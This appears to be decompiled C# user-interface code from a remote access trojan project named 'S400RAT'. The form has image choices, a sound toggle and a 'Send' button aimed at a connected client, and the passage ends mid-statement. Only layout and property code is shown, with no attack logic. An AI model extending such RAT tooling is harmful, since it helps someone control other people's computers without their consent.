using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SQLABC_ModernUI;

namespace S400RAT;

[DesignerGenerated]
public class HRR : Form
{
	public IContainer icontainer_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2AnimateWindow1")]
	public Guna2AnimateWindow guna2AnimateWindow_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2BorderlessForm1")]
	public Guna2BorderlessForm guna2BorderlessForm_0;

	[AccessedThroughProperty("Panel1")]
	[CompilerGenerated]
	public Panel panel_0;

	[CompilerGenerated]
	[AccessedThroughProperty("panel5")]
	public Panel panel_1;

	[CompilerGenerated]
	[AccessedThroughProperty("n")]
	public Label label_0;

	[CompilerGenerated]
	[AccessedThroughProperty("w")]
	public Label label_1;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox1")]
	public PictureBox pictureBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Label2")]
	public Label label_2;

	[AccessedThroughProperty("Label7")]
	[CompilerGenerated]
	public Label label_3;

	[AccessedThroughProperty("Label1")]
	[CompilerGenerated]
	public Label label_4;

	[AccessedThroughProperty("pictureBox3")]
	[CompilerGenerated]
	public PictureBox pictureBox_1;

	[AccessedThroughProperty("label9")]
	[CompilerGenerated]
	public Label label_5;

	[AccessedThroughProperty("Guna2ControlBox1")]
	[CompilerGenerated]
	public Guna2ControlBox guna2ControlBox_0;

	[AccessedThroughProperty("Panel2")]
	[CompilerGenerated]
	public Panel panel_2;

	[AccessedThroughProperty("C1")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_0;

	[AccessedThroughProperty("C2")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_1;

	[AccessedThroughProperty("C3")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_2;

	[AccessedThroughProperty("C4")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_3;

	[CompilerGenerated]
	[AccessedThroughProperty("Label6")]
	public Label label_6;

	[AccessedThroughProperty("Panel3")]
	[CompilerGenerated]
	public Panel panel_3;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox8")]
	public PictureBox pictureBox_2;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2RadioButton1")]
	public Guna2RadioButton guna2RadioButton_4;

	[AccessedThroughProperty("PictureBox6")]
	[CompilerGenerated]
	public PictureBox pictureBox_3;

	[AccessedThroughProperty("PictureBox2")]
	[CompilerGenerated]
	public PictureBox pictureBox_4;

	[AccessedThroughProperty("PictureBox4")]
	[CompilerGenerated]
	public PictureBox pictureBox_5;

	[AccessedThroughProperty("PictureBox5")]
	[CompilerGenerated]
	public PictureBox pictureBox_6;

	[AccessedThroughProperty("PictureBox7")]
	[CompilerGenerated]
	public PictureBox pictureBox_7;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2GradientButton3")]
	public Guna2GradientButton guna2GradientButton_0;

	[AccessedThroughProperty("Guna2GradientButton4")]
	[CompilerGenerated]
	public Guna2GradientButton guna2GradientButton_1;

	[AccessedThroughProperty("Label3")]
	[CompilerGenerated]
	public Label label_7;

	[CompilerGenerated]
	[AccessedThroughProperty("ONN")]
	public Guna2RadioButton guna2RadioButton_5;

	[AccessedThroughProperty("Guna2RadioButton2")]
	[CompilerGenerated]
	public Guna2RadioButton guna2RadioButton_6;

	[AccessedThroughProperty("T1")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Label5")]
	public Label label_8;

	[CompilerGenerated]
	[AccessedThroughProperty("SqlabC_ControlMini1")]
	public SQLABC_ControlMini sqlabc_ControlMini_0;

	[AccessedThroughProperty("Clos")]
	[CompilerGenerated]
	public Timer timer_0;

	public Client C;

	public virtual Panel Panel1
	{
		[CompilerGenerated]
		get
		{
			return panel_0;
		}
		[CompilerGenerated]
		set
		{
			panel_0 = value;
		}
	}

	public virtual Panel panel5
	{
		[CompilerGenerated]
		get
		{
			return panel_1;
		}
		[CompilerGenerated]
		set
		{
			panel_1 = value;
		}
	}

	internal virtual Label n
	{
		[CompilerGenerated]
		get
		{
			return label_0;
		}
		[CompilerGenerated]
		set
		{
			label_0 = value;
		}
	}

	internal virtual Label w
	{
		[CompilerGenerated]
		get
		{
			return label_1;
		}
		[CompilerGenerated]
		set
		{
			label_1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	public virtual Label Label2
	{
		[CompilerGenerated]
		get
		{
			return label_2;
		}
		[CompilerGenerated]
		set
		{
			label_2 = value;
		}
	}

	public virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return label_3;
		}
		[CompilerGenerated]
		set
		{
			label_3 = value;
		}
	}

	public virtual Label Label1
	{
		[CompilerGenerated]
		get
		{
			return label_4;
		}
		[CompilerGenerated]
		set
		{
			label_4 = value;
		}
	}

	public virtual PictureBox pictureBox3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_1 = value;
		}
	}

	public virtual Label label9
	{
		[CompilerGenerated]
		get
		{
			return label_5;
		}
		[CompilerGenerated]
		set
		{
			label_5 = value;
		}
	}

	internal virtual Guna2ControlBox Guna2ControlBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2ControlBox_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_11;
			Guna2ControlBox guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click -= value2;
			}
			guna2ControlBox_0 = value;
			guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click += value2;
			}
		}
	}

	public virtual Panel Panel2
	{
		[CompilerGenerated]
		get
		{
			return panel_2;
		}
		[CompilerGenerated]
		set
		{
			panel_2 = value;
		}
	}

	internal virtual Guna2RadioButton C1
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_4;
			Guna2RadioButton guna2RadioButton = guna2RadioButton_0;
			if (guna2RadioButton != null)
			{
				guna2RadioButton.CheckedChanged -= value2;
			}
			guna2RadioButton_0 = value;
			guna2RadioButton = guna2RadioButton_0;
			if (guna2RadioButton != null)
			{
				guna2RadioButton.CheckedChanged += value2;
			}
		}
	}

	internal virtual Guna2RadioButton C2
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_5;
			Guna2RadioButton guna2RadioButton = guna2RadioButton_1;
			if (guna2RadioButton != null)
			{
				guna2RadioButton.CheckedChanged -= value2;
			}
			guna2RadioButton_1 = value;
			guna2RadioButton = guna2RadioButton_1;
			if (guna2RadioButton != null)
			{
				guna2RadioButton.CheckedChanged += value2;
			}
		}
	}

	internal virtual Guna2RadioButton C3
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_2;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_6;
			Guna2RadioButton guna2RadioButton = guna2RadioButton_2;
			if (guna2RadioButton != null)
			{
				guna2RadioButton.CheckedChanged -= value2;
			}
			guna2RadioButton_2 = value;
			guna2RadioButton = guna2RadioButton_2;
			if (guna2RadioButton != null)
			{
				guna2RadioButton.CheckedChanged += value2;
			}
		}
	}

	internal virtual Guna2RadioButton C4
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_3;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_8;
			Guna2RadioButton guna2RadioButton = guna2RadioButton_3;
			if (guna2RadioButton != null)
			{
				guna2RadioButton.CheckedChanged -= value2;
			}
			guna2RadioButton_3 = value;
			guna2RadioButton = guna2RadioButton_3;
			if (guna2RadioButton != null)
			{
				guna2RadioButton.CheckedChanged += value2;
			}
		}
	}

	public virtual Label Label6
	{
		[CompilerGenerated]
		get
		{
			return label_6;
		}
		[CompilerGenerated]
		set
		{
			label_6 = value;
		}
	}

	public virtual Panel Panel3
	{
		[CompilerGenerated]
		get
		{
			return panel_3;
		}
		[CompilerGenerated]
		set
		{
			PaintEventHandler value2 = method_9;
			Panel panel = panel_3;
			if (panel != null)
			{
				panel.Paint -= value2;
			}
			panel_3 = value;
			panel = panel_3;
			if (panel != null)
			{
				panel.Paint += value2;
			}
		}
	}

	internal virtual PictureBox PictureBox8
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_2;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_2 = value;
		}
	}

	internal virtual Guna2RadioButton Guna2RadioButton1
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_4;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_7;
			Guna2RadioButton guna2RadioButton = guna2RadioButton_4;
			if (guna2RadioButton != null)
			{
				guna2RadioButton.CheckedChanged -= value2;
			}
			guna2RadioButton_4 = value;
			guna2RadioButton = guna2RadioButton_4;
			if (guna2RadioButton != null)
			{
				guna2RadioButton.CheckedChanged += value2;
			}
		}
	}

	internal virtual PictureBox PictureBox6
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_3;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_3 = value;
		}
	}

	internal virtual PictureBox PictureBox2
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_4;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_4 = value;
		}
	}

	internal virtual PictureBox PictureBox4
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_5;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_5 = value;
		}
	}

	internal virtual PictureBox PictureBox5
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_6;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_6 = value;
		}
	}

	internal virtual PictureBox PictureBox7
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_7;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_7 = value;
		}
	}

	internal virtual Guna2GradientButton Guna2GradientButton3
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_3;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_0 = value;
			guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual Guna2GradientButton Guna2GradientButton4
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_1;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_2;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_1;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_1 = value;
			guna2GradientButton = guna2GradientButton_1;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	public virtual Label Label3
	{
		[CompilerGenerated]
		get
		{
			return label_7;
		}
		[CompilerGenerated]
		set
		{
			label_7 = value;
		}
	}

	internal virtual Guna2RadioButton ONN
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_5;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_5 = value;
		}
	}

	internal virtual Guna2RadioButton Guna2RadioButton2
	{
		[CompilerGenerated]
		get
		{
			return guna2RadioButton_6;
		}
		[CompilerGenerated]
		set
		{
			guna2RadioButton_6 = value;
		}
	}

	internal virtual Guna2TextBox T1
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_1;
			Guna2TextBox guna2TextBox = guna2TextBox_0;
			if (guna2TextBox != null)
			{
				guna2TextBox.TextChanged -= value2;
			}
			guna2TextBox_0 = value;
			guna2TextBox = guna2TextBox_0;
			if (guna2TextBox != null)
			{
				guna2TextBox.TextChanged += value2;
			}
		}
	}

	public virtual Label Label5
	{
		[CompilerGenerated]
		get
		{
			return label_8;
		}
		[CompilerGenerated]
		set
		{
			label_8 = value;
		}
	}

	internal virtual SQLABC_ControlMini SqlabC_ControlMini1
	{
		[CompilerGenerated]
		get
		{
			return sqlabc_ControlMini_0;
		}
		[CompilerGenerated]
		set
		{
			sqlabc_ControlMini_0 = value;
		}
	}

	public HRR()
	{
		base.Load += HRR_Load;
		method_0();
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	public void method_0()
	{
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(HRR));
		vmethod_1(new Guna2AnimateWindow(icontainer_0));
		vmethod_3(new Guna2BorderlessForm(icontainer_0));
		Panel1 = new Panel();
		Panel3 = new Panel();
		Label5 = new Label();
		Label3 = new Label();
		ONN = new Guna2RadioButton();
		Guna2RadioButton2 = new Guna2RadioButton();
		T1 = new Guna2TextBox();
		Guna2GradientButton3 = new Guna2GradientButton();
		Guna2GradientButton4 = new Guna2GradientButton();
		PictureBox8 = new PictureBox();
		Panel2 = new Panel();
		Guna2RadioButton1 = new Guna2RadioButton();
		PictureBox6 = new PictureBox();
		PictureBox2 = new PictureBox();
		PictureBox4 = new PictureBox();
		PictureBox5 = new PictureBox();
		PictureBox7 = new PictureBox();
		C1 = new Guna2RadioButton();
		C2 = new Guna2RadioButton();
		C3 = new Guna2RadioButton();
		C4 = new Guna2RadioButton();
		Label6 = new Label();
		panel5 = new Panel();
		n = new Label();
		w = new Label();
		PictureBox1 = new PictureBox();
		Label2 = new Label();
		Label7 = new Label();
		Label1 = new Label();
		pictureBox3 = new PictureBox();
		label9 = new Label();
		Guna2ControlBox1 = new Guna2ControlBox();
		SqlabC_ControlMini1 = new SQLABC_ControlMini();
		vmethod_5(new Timer(icontainer_0));
		Panel1.SuspendLayout();
		Panel3.SuspendLayout();
		((ISupportInitialize)PictureBox8).BeginInit();
		Panel2.SuspendLayout();
		((ISupportInitialize)PictureBox6).BeginInit();
		((ISupportInitialize)PictureBox2).BeginInit();
		((ISupportInitialize)PictureBox4).BeginInit();
		((ISupportInitialize)PictureBox5).BeginInit();
		((ISupportInitialize)PictureBox7).BeginInit();
		panel5.SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		SuspendLayout();
		vmethod_0().AnimationType = Guna2AnimateWindow.AnimateWindowType.AW_BLEND;
		vmethod_2().ContainerControl = this;
		Panel1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		Panel1.BackColor = Color.FromArgb(24, 30, 54);
		Panel1.Controls.Add(Panel3);
		Panel1.Controls.Add(Panel2);
		Panel1.ForeColor = Color.Transparent;
		Panel1.Location = new Point(9, 132);
		Panel1.Name = "Panel1";
		Panel1.Size = new Size(660, 341);
		Panel1.TabIndex = 132;
		Panel3.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		Panel3.BackColor = Color.FromArgb(37, 42, 64);
		Panel3.Controls.Add(Label5);
		Panel3.Controls.Add(Label3);
		Panel3.Controls.Add(ONN);
		Panel3.Controls.Add(Guna2RadioButton2);
		Panel3.Controls.Add(T1);
		Panel3.Controls.Add(Guna2GradientButton3);
		Panel3.Controls.Add(Guna2GradientButton4);
		Panel3.Controls.Add(PictureBox8);
		Panel3.ForeColor = Color.FromArgb(37, 42, 64);
		Panel3.Location = new Point(13, 198);
		Panel3.Name = "Panel3";
		Panel3.Size = new Size(631, 126);
		Panel3.TabIndex = 104;
		Label5.AutoSize = true;
		Label5.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label5.ForeColor = Color.White;
		Label5.Location = new Point(11, 9);
		Label5.Name = "Label5";
		Label5.Size = new Size(33, 17);
		Label5.TabIndex = 111;
		Label5.Text = "Path";
		Label3.AutoSize = true;
		Label3.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label3.ForeColor = Color.White;
		Label3.Location = new Point(3, 72);
		Label3.Name = "Label3";
		Label3.Size = new Size(45, 17);
		Label3.TabIndex = 108;
		Label3.Text = "Sound";
		ONN.AutoSize = true;
		ONN.Checked = true;
		ONN.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		ONN.CheckedState.BorderThickness = 0;
		ONN.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		ONN.CheckedState.InnerColor = Color.White;
		ONN.CheckedState.InnerOffset = -4;
		ONN.Cursor = Cursors.Hand;
		ONN.Font = new Font("Segoe UI", 9f);
		ONN.ForeColor = Color.White;
		ONN.Location = new Point(75, 99);
		ONN.Name = "ONN";
		ONN.Size = new Size(43, 19);
		ONN.TabIndex = 107;
		ONN.TabStop = true;
		ONN.Text = "ON";
		ONN.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		ONN.UncheckedState.BorderThickness = 2;
		ONN.UncheckedState.FillColor = Color.Transparent;
		ONN.UncheckedState.InnerColor = Color.Transparent;
		Guna2RadioButton2.AutoSize = true;
		Guna2RadioButton2.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Guna2RadioButton2.CheckedState.BorderThickness = 0;
		Guna2RadioButton2.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Guna2RadioButton2.CheckedState.InnerColor = Color.White;
		Guna2RadioButton2.CheckedState.InnerOffset = -4;
		Guna2RadioButton2.Cursor = Cursors.Hand;
		Guna2RadioButton2.Font = new Font("Segoe UI", 9f);
		Guna2RadioButton2.ForeColor = Color.White;
		Guna2RadioButton2.Location = new Point(6, 99);
		Guna2RadioButton2.Name = "Guna2RadioButton2";
		Guna2RadioButton2.Size = new Size(46, 19);
		Guna2RadioButton2.TabIndex = 106;
		Guna2RadioButton2.Text = "OFF";
		Guna2RadioButton2.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Guna2RadioButton2.UncheckedState.BorderThickness = 2;
		Guna2RadioButton2.UncheckedState.FillColor = Color.Transparent;
		Guna2RadioButton2.UncheckedState.InnerColor = Color.Transparent;
		T1.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		T1.Animated = true;
		T1.AutoRoundedCorners = true;
		T1.BackColor = Color.FromArgb(37, 42, 64);
		T1.BorderColor = Color.FromArgb(0, 126, 249);
		T1.BorderRadius = 13;
		T1.BorderStyle = DashStyle.Custom;
		T1.Cursor = Cursors.IBeam;
		T1.DefaultText = "";
		T1.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		T1.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		T1.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		T1.DisabledState.Parent = T1;
		T1.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		T1.FillColor = Color.FromArgb(37, 42, 64);
		T1.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		T1.FocusedState.Parent = T1;
		T1.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		T1.ForeColor = Color.White;
		T1.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		T1.HoverState.Parent = T1;
		T1.Location = new Point(6, 28);
		T1.Margin = new Padding(3, 2, 3, 2);
		T1.Name = "T1";
		T1.PasswordChar = '\0';
		T1.PlaceholderForeColor = Color.Gray;
		T1.PlaceholderText = "";
		T1.ReadOnly = true;
		T1.SelectedText = "";
		T1.ShadowDecoration.Parent = T1;
		T1.Size = new Size(485, 29);
		T1.Style = TextBoxStyle.Material;
		T1.TabIndex = 105;
		Guna2GradientButton3.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		Guna2GradientButton3.Animated = true;
		Guna2GradientButton3.BackColor = Color.Transparent;
		Guna2GradientButton3.BorderColor = Color.FromArgb(24, 30, 54);
		Guna2GradientButton3.CheckedState.Parent = Guna2GradientButton3;
		Guna2GradientButton3.CustomImages.Parent = Guna2GradientButton3;
		Guna2GradientButton3.FillColor = Color.FromArgb(24, 30, 54);
		Guna2GradientButton3.FillColor2 = Color.FromArgb(24, 30, 54);
		Guna2GradientButton3.Font = new Font("Segoe UI", 9f);
		Guna2GradientButton3.ForeColor = Color.White;
		Guna2GradientButton3.HoverState.Parent = Guna2GradientButton3;
		Guna2GradientButton3.ImageAlign = HorizontalAlignment.Left;
		Guna2GradientButton3.IndicateFocus = true;
		Guna2GradientButton3.Location = new Point(313, 72);
		Guna2GradientButton3.Name = "Guna2GradientButton3";
		Guna2GradientButton3.ShadowDecoration.Parent = Guna2GradientButton3;
		Guna2GradientButton3.Size = new Size(178, 46);
		Guna2GradientButton3.TabIndex = 81;
		Guna2GradientButton3.Text = "Chose";
		Guna2GradientButton3.UseTransparentBackground = true;
		Guna2GradientButton4.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		Guna2GradientButton4.Animated = true;
		Guna2GradientButton4.BackColor = Color.Transparent;
		Guna2GradientButton4.CheckedState.Parent = Guna2GradientButton4;
		Guna2GradientButton4.CustomImages.Parent = Guna2GradientButton4;
		Guna2GradientButton4.FillColor = Color.FromArgb(24, 30, 54);
		Guna2GradientButton4.FillColor2 = Color.FromArgb(24, 30, 54);
		Guna2GradientButton4.Font = new Font("Segoe UI", 9f);
		Guna2GradientButton4.ForeColor = Color.White;
		Guna2GradientButton4.HoverState.Parent = Guna2GradientButton4;
		Guna2GradientButton4.ImageAlign = HorizontalAlignment.Left;
		Guna2GradientButton4.IndicateFocus = true;
		Guna2GradientButton4.Location = new Point(139, 72);
		Guna2GradientButton4.Name = "Guna2GradientButton4";
		Guna2GradientButton4.ShadowDecoration.Parent = Guna2GradientButton4;
		Guna2GradientButton4.Size = new Size(168, 46);
		Guna2GradientButton4.TabIndex = 82;
		Guna2GradientButton4.Text = "Send";
		Guna2GradientButton4.UseTransparentBackground = true;
		PictureBox8.BackColor = Color.FromArgb(24, 30, 54);
		PictureBox8.BorderStyle = BorderStyle.FixedSingle;
		PictureBox8.Cursor = Cursors.Hand;
		PictureBox8.Location = new Point(504, 33);
		PictureBox8.Name = "PictureBox8";
		PictureBox8.Size = new Size(116, 90);
		PictureBox8.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox8.TabIndex = 53;
		PictureBox8.TabStop = false;
		Panel2.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		Panel2.BackColor = Color.Black;
		Panel2.Controls.Add(Guna2RadioButton1);
		Panel2.Controls.Add(PictureBox6);
		Panel2.Controls.Add(PictureBox2);
		Panel2.Controls.Add(PictureBox4);
		Panel2.Controls.Add(PictureBox5);
		Panel2.Controls.Add(PictureBox7);
		Panel2.Controls.Add(C1);
		Panel2.Controls.Add(C2);
		Panel2.Controls.Add(C3);
		Panel2.Controls.Add(C4);
		Panel2.Controls.Add(Label6);
		Panel2.ForeColor = Color.FromArgb(37, 42, 64);
		Panel2.Location = new Point(13, 12);
		Panel2.Name = "Panel2";
		Panel2.Size = new Size(631, 180);
		Panel2.TabIndex = 103;
		Guna2RadioButton1.AutoSize = true;
		Guna2RadioButton1.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		Guna2RadioButton1.CheckedState.BorderThickness = 0;
		Guna2RadioButton1.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		Guna2RadioButton1.CheckedState.InnerColor = Color.White;
		Guna2RadioButton1.CheckedState.InnerOffset = -4;
		Guna2RadioButton1.Cursor = Cursors.Hand;
		Guna2RadioButton1.Font = new Font("Segoe UI", 9f);
		Guna2RadioButton1.ForeColor = Color.FromArgb(0, 126, 249);
		Guna2RadioButton1.Location = new Point(421, 145);
		Guna2RadioButton1.Name = "Guna2RadioButton1";
		Guna2RadioButton1.Size = new Size(14, 13);
		Guna2RadioButton1.TabIndex = 53;
		Guna2RadioButton1.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		Guna2RadioButton1.UncheckedState.BorderThickness = 2;
		Guna2RadioButton1.UncheckedState.FillColor = Color.Transparent;
		Guna2RadioButton1.UncheckedState.InnerColor = Color.Transparent;
		PictureBox6.BorderStyle = BorderStyle.FixedSingle;
		PictureBox6.Cursor = Cursors.Hand;
		PictureBox6.Image = (Image)componentResourceManager.GetObject("PictureBox6.Image");
		PictureBox6.Location = new Point(494, 31);
		PictureBox6.Name = "PictureBox6";
		PictureBox6.Size = new Size(116, 98);
		PictureBox6.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox6.TabIndex = 52;
		PictureBox6.TabStop = false;
		PictureBox2.BorderStyle = BorderStyle.FixedSingle;
		PictureBox2.Cursor = Cursors.Hand;
		PictureBox2.Image = (Image)componentResourceManager.GetObject("PictureBox2.Image");
		PictureBox2.Location = new Point(372, 31);
		PictureBox2.Name = "PictureBox2";
		PictureBox2.Size = new Size(116, 98);
		PictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox2.TabIndex = 51;
		PictureBox2.TabStop = false;
		PictureBox4.BorderStyle = BorderStyle.FixedSingle;
		PictureBox4.Cursor = Cursors.Hand;
		PictureBox4.Image = (Image)componentResourceManager.GetObject("PictureBox4.Image");
		PictureBox4.Location = new Point(250, 31);
		PictureBox4.Name = "PictureBox4";
		PictureBox4.Size = new Size(116, 98);
		PictureBox4.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox4.TabIndex = 50;
		PictureBox4.TabStop = false;
		PictureBox5.BorderStyle = BorderStyle.FixedSingle;
		PictureBox5.Cursor = Cursors.Hand;
		PictureBox5.Image = (Image)componentResourceManager.GetObject("PictureBox5.Image");
		PictureBox5.Location = new Point(128, 31);
		PictureBox5.Name = "PictureBox5";
		PictureBox5.Size = new Size(116, 98);
		PictureBox5.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox5.TabIndex = 49;
		PictureBox5.TabStop = false;
		PictureBox7.BorderStyle = BorderStyle.FixedSingle;
		PictureBox7.Cursor = Cursors.Hand;
		PictureBox7.Image = (Image)componentResourceManager.GetObject("PictureBox7.Image");
		PictureBox7.Location = new Point(6, 31);
		PictureBox7.Name = "PictureBox7";
		PictureBox7.Size = new Size(116, 98);
		PictureBox7.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox7.TabIndex = 48;
		PictureBox7.TabStop = false;
		C1.AutoSize = true;
		C1.Checked = true;
		C1.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		C1.CheckedState.BorderThickness = 0;
		C1.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		C1.CheckedState.InnerColor = Color.White;
		C1.CheckedState.InnerOffset = -4;
		C1.Cursor = Cursors.Hand;
		C1.Font = new Font("Segoe UI", 9f);
		C1.ForeColor = Color.FromArgb(0, 126, 249);
		C1.Location = new Point(63, 145);
		C1.Name = "C1";
		C1.Size = new Size(14, 13);
		C1.TabIndex = 47;
		C1.TabStop = true;
		C1.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		C1.UncheckedState.BorderThickness = 2;
		C1.UncheckedState.FillColor = Color.Transparent;
		C1.UncheckedState.InnerColor = Color.Transparent;
		C2.AutoSize = true;
		C2.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		C2.CheckedState.BorderThickness = 0;
		C2.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		C2.CheckedState.InnerColor = Color.White;
		C2.CheckedState.InnerOffset = -4;
		C2.Cursor = Cursors.Hand;
		C2.Font = new Font("Segoe UI", 9f);
		C2.ForeColor = Color.FromArgb(0, 126, 249);
		C2.Location = new Point(182, 145);
		C2.Name = "C2";
		C2.Size = new Size(14, 13);
		C2.TabIndex = 46;
		C2.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		C2.UncheckedState.BorderThickness = 2;
		C2.UncheckedState.FillColor = Color.Transparent;
		C2.UncheckedState.InnerColor = Color.Transparent;
		C3.AutoSize = true;
		C3.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		C3.CheckedState.BorderThickness = 0;
		C3.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		C3.CheckedState.InnerColor = Color.White;
		C3.CheckedState.InnerOffset = -4;
		C3.Cursor = Cursors.Hand;
		C3.Font = new Font("Segoe UI", 9f);
		C3.ForeColor = Color.FromArgb(0, 126, 249);
		C3.Location = new Point(310, 145);
		C3.Name = "C3";
		C3.Size = new Size(14, 13);
		C3.TabIndex = 45;
		C3.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		C3.UncheckedState.BorderThickness = 2;
		C3.UncheckedState.FillColor = Color.Transparent;
		C3.UncheckedState.InnerColor = Color.Transparent;
		C4.AutoSize = true;
		C4.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		C4.CheckedState.BorderThickness = 0;
		C4.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		C4.CheckedState.InnerColor = Color.White;
		C4.CheckedState.InnerOffset = -4;
		C4.Cursor = Cursors.Hand;
		C4.Font = new Font("Segoe UI", 9f);
		C4.ForeColor = Color.FromArgb(0, 126, 249);
		C4.Location = new Point(555, 145);
		C4.Name = "C4";
		C4.Size = new Size(14, 13);
		C4.TabIndex = 44;
		C4.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		C4.UncheckedState.BorderThickness = 2;
		C4.UncheckedState.FillColor = Color.Transparent;
